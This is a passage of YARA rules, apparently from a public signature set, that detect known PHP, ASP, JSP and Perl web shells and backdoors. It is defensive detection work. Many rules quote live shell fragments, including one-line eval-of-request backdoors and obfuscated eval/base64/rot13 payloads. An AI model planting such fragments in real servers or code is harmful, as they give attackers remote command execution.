		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "fbf2e76e6f897f6f42b896c855069276"
		logic_hash = "0350df076a25af77fbd8d5db2b38438a10cd5b9237b23b2f64c6360607b41982"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<?php $s=@$_GET[2];if(md5($s.$s)=="

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_Bypass_Iisuser_P
{
	meta:
		description = "Web shells - generated from file bypass-iisuser-p.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-03-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L3298-L3311"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "924d294400a64fa888a79316fb3ccd90"
		logic_hash = "60d0609291e5def26ce949c903ac767db4157b4f9cf4eee315c69ee7a8d8e77b"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<%Eval(Request(chr(112))):Set fso=CreateObject"

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_Sig_404Super
{
	meta:
		description = "Web shells - generated from file 404super.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-03-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L3312-L3330"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "7ed63176226f83d36dce47ce82507b28"
		logic_hash = "01ecffc6bca2acf1ea4f4d965f3513f7b08ee3d5abbda29d53081f2931ecf9e9"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s4 = "$i = pack('c*', 0x70, 0x61, 99, 107);" fullword
		$s6 = "    'h' => $i('H*', '687474703a2f2f626c616b696e2e64756170702e636f6d2f7631')," fullword
		$s7 = "//http://require.duapp.com/session.php" fullword
		$s8 = "if(!isset($_SESSION['t'])){$_SESSION['t'] = $GLOBALS['f']($GLOBALS['h']);}" fullword
		$s12 = "//define('pass','123456');" fullword
		$s13 = "$GLOBALS['c']($GLOBALS['e'](null, $GLOBALS['s']('%s',$GLOBALS['p']('H*',$_SESSIO"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Webshell_Webshell_123
{
	meta:
		description = "Web shells - generated from file webshell-123.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-03-28"
		modified = "2023-01-27"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L3347-L3364"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "2782bb170acaed3829ea9a04f0ac7218"
		logic_hash = "1caccadf2bd7d265f9b5026c82acc31ade95313d57382651004db8b5e361312d"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "// Web Shell!!" fullword
		$s1 = "@preg_replace(\"/.*/e\",\"\\x65\\x76\\x61\\x6C\\x28\\x67\\x7A\\x69\\x6E\\x66\\x6"
		$s3 = "$default_charset = \"UTF-8\";" fullword
		$s4 = "// url:http://www.weigongkai.com/shell/"

	condition:
		2 of them
}

rule SIGNATURE_BASE_Webshell_Webshells_New_Php
{
	meta:
		description = "Web shells - generated from file pHp.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-03-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L3384-L3401"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "b0e842bdf83396c3ef8c71ff94e64167"
		logic_hash = "a943f3b0d1d56194e250c7cf3e05b2bfec7b29f91ef56085d645efa3fe8995c9"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "if(is_readable($path)) antivirus($path.'/',$exs,$matches);" fullword
		$s1 = "'/(eval|assert|include|require|include\\_once|require\\_once|array\\_map|arr"
		$s13 = "'/(exec|shell\\_exec|system|passthru)+\\s*\\(\\s*\\$\\_(\\w+)\\[(.*)\\]\\s*"
		$s14 = "'/(include|require|include\\_once|require\\_once)+\\s*\\(\\s*[\\'|\\\"](\\w+"
		$s19 = "'/\\$\\_(\\w+)(.*)(eval|assert|include|require|include\\_once|require\\_once"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Webshell_Webshells_New_Code
{
	meta:
		description = "Web shells - generated from file code.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-03-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L3418-L3435"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "a444014c134ff24c0be5a05c02b81a79"
		logic_hash = "5ae053a9afc1f720c56304c434cd89861e1df4060b7d813921e7f85978227020"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "<a class=\"high2\" href=\"javascript:;;;\" name=\"action=show&dir=$_ipage_fi"
		$s7 = "$file = !empty($_POST[\"dir\"]) ? urldecode(self::convert_to_utf8(rtrim($_PO"
		$s10 = "if (true==@move_uploaded_file($_FILES['userfile']['tmp_name'],self::convert_"
		$s14 = "Processed in <span id=\"runtime\"></span> second(s) {gzip} usage:"
		$s17 = "<a href=\"javascript:;;;\" name=\"{return_link}\" onclick=\"fileperm"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Webshell_Webshells_New_Jspyyy
{
	meta:
		description = "Web shells - generated from file jspyyy.jsp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-03-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L3436-L3449"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "b291bf3ccc9dac8b5c7e1739b8fa742e"
		logic_hash = "0afe45556aa7b562672cc4b609cf001aaa617b03028322abac6524f666b069e1"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<%@page import=\"java.io.*\"%><%if(request.getParameter(\"f\")"

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_Webshells_New_Xxxx
{
	meta:
		description = "Web shells - generated from file xxxx.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-03-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L3450-L3463"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "5bcba70b2137375225d8eedcde2c0ebb"
		logic_hash = "e14cc1eaf357389ca58193c77ce2f54774aebb42be9df15f12415df356c7ed42"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<?php eval($_POST[1]);?>  " fullword

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_Webshells_New_Jjjsp3
{
	meta:
		description = "Web shells - generated from file JJjsp3.jsp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-03-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L3464-L3477"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "949ffee1e07a1269df7c69b9722d293e"
		logic_hash = "44889540effa2f71889e7f6d0c5d12486e256d83b9230c4902d56f6a59b7939b"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<%@page import=\"java.io.*,java.util.*,java.net.*,java.sql.*,java.text.*\"%><%!S"

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_Webshells_New_PHP1
{
	meta:
		description = "Web shells - generated from file PHP1.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-03-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L3478-L3493"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "14c7281fdaf2ae004ca5fec8753ce3cb"
		logic_hash = "1c5eb355455c7fbd2b74d91f78e1d77f460dfeb4fe0ee65f18aa1453337b67a0"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<[url=mailto:?@array_map($_GET[]?@array_map($_GET['f'],$_GET[/url]);?>" fullword
		$s2 = ":https://forum.90sec.org/forum.php?mod=viewthread&tid=7316" fullword
		$s3 = "@preg_replace(\"/f/e\",$_GET['u'],\"fengjiao\"); " fullword

	condition:
		1 of them
}

rule SIGNATURE_BASE_Webshell_Webshells_New_Jjjsp2
{
	meta:
		description = "Web shells - generated from file JJJsp2.jsp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-03-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L3494-L3510"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "5a9fec45236768069c99f0bfd566d754"
		logic_hash = "47dca67c7a01035996d032cb3871da5532aea81ab6570c93c4a6b148fd95e9f9"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s2 = "QQ(cs, z1, z2, sb,z2.indexOf(\"-to:\")!=-1?z2.substring(z2.indexOf(\"-to:\")+4,z"
		$s8 = "sb.append(l[i].getName() + \"/\\t\" + sT + \"\\t\" + l[i].length()+ \"\\t\" + sQ"
		$s10 = "ResultSet r = s.indexOf(\"jdbc:oracle\")!=-1?c.getMetaData()"
		$s11 = "return DriverManager.getConnection(x[1].trim()+\":\"+x[4],x[2].equalsIgnoreCase("

	condition:
		1 of them
}

rule SIGNATURE_BASE_Webshell_Webshells_New_Radhat
{
	meta:
		description = "Web shells - generated from file radhat.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-03-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L3511-L3524"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "72cb5ef226834ed791144abaa0acdfd4"
		logic_hash = "28d4d380b25da05a3be439bad72725fa49c947535dfeb5c24994a849c0592b81"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "sod=Array(\"D\",\"7\",\"S"

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_Webshells_New_Asp1
{
	meta:
		description = "Web shells - generated from file asp1.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-03-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L3525-L3539"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "b63e708cd58ae1ec85cf784060b69cad"
		logic_hash = "6c76c5388825e29d333096d4cfa3782b7776f31b206a0ed5a8809428d698778b"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = " http://www.baidu.com/fuck.asp?a=)0(tseuqer%20lave " fullword
		$s2 = " <% a=request(chr(97)) ExecuteGlobal(StrReverse(a)) %>" fullword

	condition:
		1 of them
}

rule SIGNATURE_BASE_Webshell_Webshells_New_Php6
{
	meta:
		description = "Web shells - generated from file php6.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-03-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L3540-L3555"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "ea75280224a735f1e445d244acdfeb7b"
		logic_hash = "495dc6c6769b8605ea946c012ad0ebb54685e7e91afd383027640753d90c6b3f"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "array_map(\"asx73ert\",(ar"
		$s3 = "preg_replace(\"/[errorpage]/e\",$page,\"saft\");" fullword
		$s4 = "shell.php?qid=zxexp  " fullword

	condition:
		1 of them
}

rule SIGNATURE_BASE_Webshell_Webshells_New_Xxx
{
	meta:
		description = "Web shells - generated from file xxx.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-03-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L3556-L3569"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "0e71428fe68b39b70adb6aeedf260ca0"
		logic_hash = "837ed266af8a65ac683be39c32509df34bc8041b336a71c12700ca73bf210b4d"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s3 = "<?php array_map(\"ass\\x65rt\",(array)$_REQUEST['expdoor']);?>" fullword

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_Getpostphp
{
	meta:
		description = "Web shells - generated from file GetPostpHp.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-03-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L3570-L3583"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "20ede5b8182d952728d594e6f2bb5c76"
		logic_hash = "e75f66200593c3fdaadf1881235847f6c3f3caadcb7ffe13e8b01bce5f922702"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<?php eval(str_rot13('riny($_CBFG[cntr]);'));?>" fullword

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_Webshells_New_Php5
{
	meta:
		description = "Web shells - generated from file php5.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-03-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L3584-L3597"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "cf2ab009cbd2576a806bfefb74906fdf"
		logic_hash = "280be378bc6cf52ef9454083180015ed00f9d0bc936620a4105c34c3a3002383"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s0 = "<?$_uU=chr(99).chr(104).chr(114);$_cC=$_uU(101).$_uU(118).$_uU(97).$_uU(108).$_u"

	condition:
		all of them
}

rule SIGNATURE_BASE_Webshell_Webshells_New_PHP
{
	meta:
		description = "Web shells - generated from file PHP.php"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-03-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L3598-L3615"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "a524e7ae8d71e37d2fd3e5fbdab405ea"
		logic_hash = "706f835f63e153f907ae8a5a48f1dc4b9d3b8511b21b7155bc045b0ebdc893fc"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "echo \"<font color=blue>Error!</font>\";" fullword
		$s2 = "<input type=\"text\" size=61 name=\"f\" value='<?php echo $_SERVER[\"SCRIPT_FILE"
		$s5 = " - ExpDoor.com</title>" fullword
		$s10 = "$f=fopen($_POST[\"f\"],\"w\");" fullword
		$s12 = "<textarea name=\"c\" cols=60 rows=15></textarea><br>" fullword

	condition:
		1 of them
}

rule SIGNATURE_BASE_Webshell_Webshells_New_Asp
{
	meta:
		description = "Web shells - generated from file Asp.asp"
		author = "Florian Roth (Nextron Systems)"
		id = "393e738a-b4c2-5630-a55f-c3caee4ff75e"
		date = "2014-03-28"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L3616-L3631"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "32c87744ea404d0ea0debd55915010b7"
		logic_hash = "dd2e9f753e8fa781c28c2d5bb9336bb3f39ed8a496bd89eb54bc1812ef512ab5"
		score = 70
		quality = 85
		tags = ""
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$s1 = "Execute MorfiCoder(\")/*/z/*/(tseuqer lave\")" fullword
		$s2 = "Function MorfiCoder(Code)" fullword
		$s3 = "MorfiCoder=Replace(Replace(StrReverse(Code),\"/*/\",\"\"\"\"),\"\\*\\\",vbCrlf)" fullword

	condition:
		1 of them
}

rule SIGNATURE_BASE_Perlbot_Pl
{
	meta:
		description = "Semi-Auto-generated  - file perlbot.pl.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "378cb0e4-2069-50b7-ab3e-5a81055e9983"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L3635-L3646"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "7e4deb9884ffffa5d82c22f8dc533a45"
		logic_hash = "784980d620e71fb0cf5aed9ef8bd171a8f50d850bc782645575070b75c42e426"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "my @adms=(\"Kelserific\",\"Puna\",\"nod32\")"
		$s1 = "#Acesso a Shel - 1 ON 0 OFF"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Php_Backdoor_Php
{
	meta:
		description = "Semi-Auto-generated  - file php-backdoor.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "aca53071-f793-538d-bbeb-34469cdb4d1f"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L3647-L3659"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "2b5cb105c4ea9b5ebc64705b4bd86bf7"
		logic_hash = "acab82b40760b45d49da51953f78c69166955de54918634c9bfe394208cdbb56"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "http://michaeldaw.org   2006"
		$s1 = "or http://<? echo $SERVER_NAME.$REQUEST_URI; ?>?d=c:/windows on win"
		$s3 = "coded by z0mbie"

	condition:
		1 of them
}

rule SIGNATURE_BASE_Liz0Zim_Private_Safe_Mode_Command_Execuriton_Bypass_Exploit_Php
{
	meta:
		description = "Semi-Auto-generated  - file Liz0ziM Private Safe Mode Command Execuriton Bypass Exploit.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "e91114ce-18f9-51cd-b41c-b796960ea4fe"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L3660-L3672"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "c6eeacbe779518ea78b8f7ed5f63fc11"
		logic_hash = "a0606dad4474579354709fe6306d15427afc4dec8ad6760a0ee9e91c86c23e4d"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "<option value=\"cat /var/cpanel/accounting.log\">/var/cpanel/accounting.log</opt"
		$s1 = "Liz0ziM Private Safe Mode Command Execuriton Bypass"
		$s2 = "echo \"<b><font color=red>Kimim Ben :=)</font></b>:$uid<br>\";" fullword

	condition:
		1 of them
}

rule SIGNATURE_BASE_Nshell__1__Php_Php
{
	meta:
		description = "Semi-Auto-generated  - file Nshell (1).php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "44e8b6c5-6f41-5c37-a083-26acedd91956"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L3673-L3684"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "973fc89694097a41e684b43a21b1b099"
		logic_hash = "53c7cd24c4eddbded1b4c16fd2758bdf66c0bbe396e487a56d56fc053cf3cc1a"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "echo \"Command : <INPUT TYPE=text NAME=cmd value=\".@stripslashes(htmlentities($"
		$s1 = "if(!$whoami)$whoami=exec(\"whoami\"); echo \"whoami :\".$whoami.\"<br>\";" fullword

	condition:
		1 of them
}

rule SIGNATURE_BASE_Shankar_Php_Php
{
	meta:
		description = "Semi-Auto-generated  - file shankar.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "0c8ab3eb-574b-5e5a-8117-4efecef94f83"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L3685-L3697"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "6eb9db6a3974e511b7951b8f7e7136bb"
		logic_hash = "58b365206c18b8394cf1e03b71b8e47be10bc933bc2c05b7b03b7dad94f6d6b8"
		score = 75
		quality = 85
		tags = ""

	strings:
		$sAuthor = "ShAnKaR"
		$s0 = "<input type=checkbox name='dd' \".(isset($_POST['dd'])?'checked':'').\">DB<input"
		$s3 = "Show<input type=text size=5 value=\".((isset($_POST['br_st']) && isset($_POST['b"

	condition:
		1 of ( $s* ) and $sAuthor
}

rule SIGNATURE_BASE_Casus15_Php_Php
{
	meta:
		description = "Semi-Auto-generated  - file Casus15.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "ba6748a2-fb80-5eda-816c-155bab9285e5"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L3698-L3710"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "5e2ede2d1c4fa1fcc3cbfe0c005d7b13"
		logic_hash = "6ee7a07163d33ca329d3be2084406629711db14db4605e8413ee963eb0f9d5a7"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "copy ( $dosya_gonder2, \"$dir/$dosya_gonder2_name\") ? print(\"$dosya_gonder2_na"
		$s2 = "echo \"<center><font size='$sayi' color='#FFFFFF'>HACKLERIN<font color='#008000'"
		$s3 = "value='Calistirmak istediginiz "

	condition:
		1 of them
}

rule SIGNATURE_BASE_Small_Php_Php
{
	meta:
		description = "Semi-Auto-generated  - file small.php.php.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "cf4fb88f-a312-560d-be0b-b55bfcb889be"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L3711-L3723"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "fcee6226d09d150bfa5f103bee61fbde"
		logic_hash = "e0444aa604e8956d423037b70b9476f5653503055d0f1bc875d43de144ce5c44"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s1 = "$pass='abcdef1234567890abcdef1234567890';" fullword
		$s2 = "eval(gzinflate(base64_decode('FJzHkqPatkU/550IGnjXxHvv6bzAe0iE5+svFVGtKqXMZq05x1"
		$s4 = "@ini_set('error_log',NULL);" fullword

	condition:
		2 of them
}

rule SIGNATURE_BASE_Shellbot_Pl
{
	meta:
		description = "Semi-Auto-generated  - file shellbot.pl.txt"
		author = "Neo23x0 Yara BRG + customization by Stefan -dfate- Molls"
		id = "07c145b1-c9f7-564a-b354-a6d2072f380c"
		date = "2025-03-29"
		modified = "2025-03-29"
		reference = "https://github.com/Neo23x0/signature-base"
		source_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/yara/thor-webshells.yar#L3724-L3738"
		license_url = "https://github.com/Neo23x0/signature-base/blob/a065133ff5763435e4e9e0f6bc72344c44b1824f/LICENSE"
		hash = "b2a883bc3c03a35cfd020dd2ace4bab8"
		logic_hash = "5db224e4fe8608bb53f044ca6c0361dc66cadd58c6d4ea5ab4f8ae14ebde0e6e"
		score = 75
		quality = 85
		tags = ""

	strings:
		$s0 = "ShellBOT"
		$s1 = "PacktsGr0up"
